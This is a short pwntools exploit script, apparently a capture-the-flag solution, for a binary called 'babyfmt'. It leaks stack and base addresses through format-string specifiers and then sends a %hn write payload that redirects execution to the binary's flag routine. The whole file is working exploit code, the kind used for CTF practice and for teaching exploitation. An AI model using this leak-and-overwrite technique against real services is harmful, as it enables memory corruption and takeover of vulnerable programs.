#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './babyfmt'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file,env={'LD_PRELOAD':remote_libc})
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
sla('tell me the time:','1 1 1')
sla('>>','2')
sl('%7$hhn%17$p.%16$p')
base = eval(ru('.'))-4140
stack = eval(ru('\n'))-40
info_addr('stack',stack)
flag = base+0xF56
info_addr('flag',flag&0xffff)
sla('>>','2')
debug()
payload = '%%%dc'%(flag&0xffff)+'%10$hn'
payload = payload.ljust(16,'A')
payload+= p64(stack)
sl(payload)

p.interactive()
